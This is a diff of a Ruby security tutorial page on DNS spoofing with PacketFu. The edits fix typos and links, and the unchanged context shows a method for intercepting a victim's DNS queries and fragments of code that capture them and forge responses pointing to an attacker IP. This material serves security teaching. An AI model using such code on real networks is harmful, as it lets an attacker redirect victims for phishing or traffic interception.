@@ -1,5 +1,5 @@
 # DNS Spoofing
-Continuing our attack through [ARP Spoofing](module_0x4__network_kungfu/arp_spoofing.md), we want to change the victim's DNS request to whatever destination we like.
+Continuing our attack through [ARP Spoofing](module_0x4__network_kung_fu/arp_spoofing.md), we want to change the victim's DNS request to whatever destination we like.
 
 ### Scenario
 ```
@@ -23,7 +23,7 @@ The same IPs of ARP spoof attack
 
 Now we cant intercept DNS Query packet coming from victim's machine. Since PacketFu supports filters in capturing (to reduce mount of captured packets) we'll use `udp and port 53 and host` filter, then we'll inspect the captured packet to ensure that it's a query then find the requested domain. [**Download DNS packet**][1].
 
-From wireshark, if we take a deeper look at the DNS query payload in `Domain Name System (query)`, we can see its been presented in hexdecimal format.
+From Wireshark, if we take a deeper look at the DNS query payload in `Domain Name System (query)`, we can see its been presented in hexadecimal format.
 
 | ![Wireshark](../images/module03/dns_spoofing_wireshark1.png) |
 |:---------------:|
@@ -36,8 +36,8 @@ Let's to anatomize our payload
 0010   74 74 65 72 03 63 6f 6d 00 00 01 00 01
 ```
 * The First 2 bytes is the **Transaction ID** and we don't care about it for now. (Our case: `\xe7\x1d`)
-* The Nex 2 bytes is the **Flags**[^3]. (We need: `\x01\x00` = \x10)
-* Farthermore, in **Queries** section which contains
+* The next 2 bytes is the **Flags**[^3]. (We need: `\x01\x00` = \x10)
+* Furthermore, in **Queries** section which contains
 
 ```
 0000   07 74 77 69 74 74 65 72 03 63 6f 6d 00 00 01 00
@@ -47,7 +47,7 @@ Let's to anatomize our payload
 
 
 * The **Queries** starts at *13 byte* of the payload.
-    * The13th byte specifies the length of the domain name *before* the *very first dot* (without last dot com or whatever the top domain is). (Our case: `\x07`)
+    * The 13th byte specifies the length of the domain name *before* the *very first dot* (without last dot com or whatever the top domain is). (Our case: `\x07`)
         **Try:**`[%w{ 74 77 69 74 74 65 72 }.join].pack("H*")`
         * Notice The domain name of "twitter.com" equals `\x07` but "www.twitter.com" equals `\x03` the same consideration for subdomains
         * Each dot after first dot will be replaced with the length of the followed characters
@@ -123,7 +123,7 @@ def readable(raw_domain)
   return fqdn.chomp!('.')
 end
 
-# * We need parse/analyze the valide UDP packets only
+# * We need parse/analyze the valid UDP packets only
 # * We need to make sure this packet is a DNS query
 #
 # Find the DNS packets
@@ -149,7 +149,7 @@ capture.stream.each do |pkt|
   end
 end
 ```
-Till now we successfully finished [ARP Spoofing](module_0x3__network_kungfu/arp_spoofing.md) then DNS capturing but still we need to replace/spoof the original response to our domain. eg. attacker.zone, now we have to build a DNS response instead of spoofed to be sent. So what we need?
+Till now we successfully finished [ARP Spoofing](module_0x3__network_kung_fu/arp_spoofing.md) then DNS capturing but still we need to replace/spoof the original response to our domain. e.g. attacker.zone, now we have to build a DNS response instead of spoofed to be sent. So what we need?
 
 * taking the IP we are going to redirect the user to (the spoofing_ip)
     * converting it into hex using the `to_i` and `pack` methods.
@@ -161,7 +161,7 @@ Till now we successfully finished [ARP Spoofing](module_0x3__network_kungfu/arp_
     * This will let you see what flags are being set.
 * From here, we just calculate the checksum for the UDP packet and send it out to the target's machine.
 
-| ![Wireshark](dns_spoofing_wireshark2.png) |
+| ![Wireshark](dns_spoofing_Wireshark2.png) |
 |:---------------:|
 | **Figure 2.** DNS Response Payload  |
 
@@ -224,7 +224,7 @@ def spoof_response(packet, domain)
   attackerdomain_name = 'rubyfu.net'
   attackerdomain_ip   = '54.243.253.221'.split('.').map {|oct| oct.to_i}.pack('c*')  # Spoofing IP
 
-  # Build UDB packet
+  # Build UDP packet
   response = UDPPacket.new(:config => PacketFu::Utils.ifconfig("wlan0"))
   response.udp_src   = packet.udp_dst             # source port
   response.udp_dst   = packet.udp_src             # destination port
